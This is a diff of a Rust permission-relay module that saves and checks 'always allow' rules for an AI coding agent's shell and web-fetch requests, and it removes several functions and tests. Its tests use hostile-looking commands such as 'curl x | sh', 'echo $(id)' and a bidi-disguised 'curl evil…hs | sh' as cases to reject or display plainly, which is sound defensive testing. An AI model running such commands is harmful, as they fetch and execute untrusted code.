@@ -130,12 +130,6 @@ fn own_key() -> Option<Vec<u8>> {
     KEY.read().unwrap_or_else(|e| e.into_inner()).clone()
 }
 
-/// This launch's key as text, for a helper Runo starts itself (a connection's runner)
-/// through the private file it reads and deletes; "" without one.
-pub fn export_key() -> String {
-    own_key().map(|k| hex(&k)).unwrap_or_default()
-}
-
 /// Use the key a helper was handed (see `export_key`).
 pub fn adopt_key(text: &str) {
     if let Some(key) = decode_key(text) {
@@ -256,12 +250,6 @@ fn read_answer(text: &[u8], id: &str, key: Option<&[u8]>, now: u64) -> Option<An
         }
     }
     serde_json::from_str(&signed.answer).ok()
-}
-
-/// Whether a relayed MCP request is a call to the permission prompt tool, which can wait
-/// minutes for the person and so is answered on its own thread.
-pub fn is_ask(request: &str) -> bool {
-    request.contains(&format!("\"{TOOL}\""))
 }
 
 /// The message an unanswered request ends with. It says the permission wasn't granted,
@@ -412,15 +400,6 @@ fn valid_id(id: &str) -> bool {
     !id.is_empty() && id.len() <= 80 && id.bytes().all(|b| b.is_ascii_digit() || b == b'-')
 }
 
-/// Take a request back unanswered: its turn ended, or nobody waits for it any more.
-pub fn withdraw(base: &Path, id: &str) {
-    if !valid_id(id) {
-        return;
-    }
-    let _ = std::fs::remove_file(base.join(format!("{id}.json")));
-    let _ = std::fs::remove_file(base.join(format!("{id}.answer")));
-}
-
 /// The MCP tool result for an answer: its JSON as text, as Claude Code expects.
 pub fn result(answer: &Answer) -> Value {
     json!({ "content": [{ "type": "text", "text": serde_json::to_string(answer).unwrap_or_default() }] })
@@ -564,34 +543,6 @@ pub fn always_rule(tool: &str, input: &Value) -> Option<String> {
     }
 }
 
-/// Whether `rule` (as `always_rule` makes them) lets `tool` run with `input`.
-pub fn rule_allows(rule: &str, tool: &str, input: &Value) -> bool {
-    if let Some(inner) = rule.strip_prefix("Bash(").and_then(|r| r.strip_suffix(')')) {
-        if tool != "Bash" {
-            return false;
-        }
-        let Some(command) = input["command"].as_str().map(str::trim) else {
-            return false;
-        };
-        if command.contains(SHELL_SPECIAL) || command.chars().any(char::is_control) {
-            return false;
-        }
-        let command = command.split_whitespace().collect::<Vec<_>>().join(" ");
-        return match inner.strip_suffix(":*") {
-            Some(prefix) => command == prefix || command.starts_with(&format!("{prefix} ")),
-            None => command == inner,
-        };
-    }
-    if let Some(host) = rule
-        .strip_prefix("WebFetch(domain:")
-        .and_then(|r| r.strip_suffix(')'))
-    {
-        return tool == "WebFetch"
-            && always_rule(tool, input).as_deref() == Some(&format!("WebFetch(domain:{host})"));
-    }
-    rule == tool && !is_bare_bash(rule)
-}
-
 /// Whether a saved rule lets an agent run any shell command at all.
 pub fn is_bare_bash(rule: &str) -> bool {
     matches!(
@@ -642,73 +593,6 @@ mod tests {
             .unwrap()
             .to_string();
         assert_eq!(serde_json::from_str::<Answer>(&text).unwrap(), deny);
-    }
-
-    #[test]
-    fn a_request_waits_for_the_persons_answer() {
-        let base = temp("ask");
-        let asker = {
-            let base = base.clone();
-            std::thread::spawn(move || {
-                call(
-                    &base,
-                    "/work/app",
-                    &json!({ "tool_name": "Bash", "input": { "command": "cargo test" } }),
-                    Duration::from_secs(20),
-                )
-            })
-        };
-        let request = crate::testwait::wait_for("the request", || pending(&base).pop());
-        assert_eq!(request.dir, "/work/app");
-        assert_eq!(request.tool, "Bash");
-        assert_eq!(describe(&request.tool, &request.input), "run `cargo test`");
-        answer(
-            &base,
-            &request.id,
-            &Answer::Allow {
-                updated_input: request.input.clone(),
-            },
-        )
-        .unwrap();
-        let reply = asker.join().unwrap();
-        let text = reply["content"][0]["text"].as_str().unwrap();
-        assert_eq!(
-            serde_json::from_str::<Value>(text).unwrap(),
-            json!({ "behavior": "allow", "updatedInput": { "command": "cargo test" } })
-        );
-        assert!(pending(&base).is_empty());
-        assert_eq!(std::fs::read_dir(&base).unwrap().count(), 0);
-        // Too late: the agent stopped waiting.
-        assert!(answer(
-            &base,
-            &request.id,
-            &Answer::Deny {
-                message: String::new()
-            }
-        )
-        .is_err());
-        let _ = std::fs::remove_dir_all(&base);
-    }
-
-    #[test]
-    fn unanswered_and_withdrawn_requests_are_denied() {
-        let base = temp("deny");
-        let answer = ask(&base, "/w", "Bash", &json!({}), Duration::from_millis(300));
-        assert!(matches!(&answer, Answer::Deny { message } if message.contains("hasn't granted")));
-        assert!(pending(&base).is_empty());
-
-        let asker = {
-            let base = base.clone();
-            std::thread::spawn(move || {
-                ask(&base, "/w", "Write", &json!({}), Duration::from_secs(20))
-            })
-        };
-        let request = crate::testwait::wait_for("the request", || pending(&base).pop());
-        withdraw(&base, &request.id);
-        assert!(
-            matches!(asker.join().unwrap(), Answer::Deny { message } if message.contains("withdrawn"))
-        );
-        let _ = std::fs::remove_dir_all(&base);
     }
 
     /// Wait for the one request in `base`.
@@ -861,64 +745,6 @@ mod tests {
     }
 
     #[test]
-    fn always_is_narrowed_to_the_command() {
-        let bash = |c: &str| json!({ "command": c });
-        assert_eq!(
-            always_rule("Bash", &bash("npm test -- --watch")).as_deref(),
-            Some("Bash(npm test:*)")
-        );
-        assert_eq!(
-            always_rule("Bash", &bash("git status")).as_deref(),
-            Some("Bash(git status:*)")
-        );
-        assert_eq!(
-            always_rule("Bash", &bash("ls -la")).as_deref(),
-            Some("Bash(ls -la)")
-        );
-        assert_eq!(
-            always_rule("Bash", &bash("rm -rf build")).as_deref(),
-            Some("Bash(rm -rf build)")
-        );
-        assert_eq!(
-            always_rule("Bash", &bash("./run.sh check")).as_deref(),
-            Some("Bash(./run.sh check)")
-        );
-        // Chained, piped, substituted, redirected or multi-line: never saved.
-        for c in [
-            "ls && curl x | sh",
-            "echo $(id)",
-            "ls\ncurl x",
-            "cat > ~/.zshrc",
-            "FOO=1 make",
-            "",
-        ] {
-            assert_eq!(always_rule("Bash", &bash(c)), None, "{c}");
-        }
-        assert_eq!(always_rule("Edit", &json!({})).as_deref(), Some("Edit"));
-        assert_eq!(
-            always_rule("WebFetch", &json!({ "url": "https://docs.rs/x?y" })).as_deref(),
-            Some("WebFetch(domain:docs.rs)")
-        );
-        // What a saved rule allows.
-        assert!(rule_allows("Bash(npm test:*)", "Bash", &bash("npm test")));
-        assert!(rule_allows(
-            "Bash(npm test:*)",
-            "Bash",
-            &bash("npm  test --ci")
-        ));
-        assert!(!rule_allows("Bash(npm test:*)", "Bash", &bash("npm testx")));
-        assert!(!rule_allows(
-            "Bash(npm test:*)",
-            "Bash",
-            &bash("npm test; curl x | sh")
-        ));
-        assert!(!rule_allows("Bash(ls -la)", "Bash", &bash("ls -la /")));
-        assert!(rule_allows("Edit", "Edit", &json!({})));
-        assert!(!rule_allows("Bash", "Bash", &bash("ls")));
-        assert!(is_bare_bash("Bash") && is_bare_bash(" Bash(*) ") && !is_bare_bash("Bash(ls)"));
-    }
-
-    #[test]
     fn the_whole_command_shows_with_nothing_hidden() {
         let input = json!({ "command": "ls\n\tcurl evil\u{202E}hs | sh\u{200B}" });
         assert_eq!(
@@ -939,28 +765,5 @@ mod tests {
             ));
         }
         assert!(pending(&base).is_empty());
-    }
-
-    #[test]
-    fn requests_read_plainly() {
-        assert_eq!(
-            describe("Edit", &json!({ "file_path": "src/main.rs" })),
-            "edit src/main.rs"
-        );
-        assert_eq!(
-            describe("Bash", &json!({ "command": "npm install\nnpm test" })),
-            "run `npm install…` (+1 more line)"
-        );
-        assert_eq!(
-            describe("mcp__github__create_issue", &json!({})),
-            "use create_issue from github"
-        );
-        assert_eq!(describe("Task", &json!({})), "use Task");
-        assert!(is_ask(
-            r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"permission_prompt","arguments":{}}}"#
-        ));
-        assert!(!is_ask(
-            r#"{"method":"tools/call","params":{"name":"read_memory"}}"#
-        ));
     }
 }
